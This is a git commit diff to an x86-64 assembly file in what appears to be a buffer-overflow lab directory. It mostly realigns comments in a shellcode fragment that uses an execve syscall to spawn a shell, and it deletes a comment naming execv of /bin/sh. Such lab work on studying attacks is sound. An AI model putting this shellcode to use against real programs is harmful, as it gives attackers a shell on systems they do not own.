9ab1c9cb95070126b492993bc3d65c68680e991c
zechengh <zcheustc@gmail.com>
2021-03-18 23:19:53 -0400

    shell

--- ad/attack/bufferoverflow/asm_test_call_shell.s
+++ ad/attack/bufferoverflow/asm_test_call_shell.s
@@ -26,14 +26,12 @@
         movq    %rcx,%rdi               /* syscall arg 2: string pathname */
         leaq    ARGV(%rcx),%rsi         /* syscall arg 2: argv */
         leaq    ENVP(%rcx),%rdx         /* syscall arg 3: envp */
-        syscall                 /* invoke syscall */
+        syscall                         /* invoke syscall */
 
-        movb    $SYS_exit,%al          /* syscall arg 1: SYS_exit (60) */
+        movb    $SYS_exit,%al           /* syscall arg 1: SYS_exit (60) */
         xorq    %rdi,%rdi               /* syscall arg 2: 0 */
-        syscall                 /* invoke syscall */
+        syscall                         /* invoke syscall */
 
  calladdr:
         call    popladdr
         .ascii  STRING
-
-    //execv("/bin/sh", NULL, NULL);
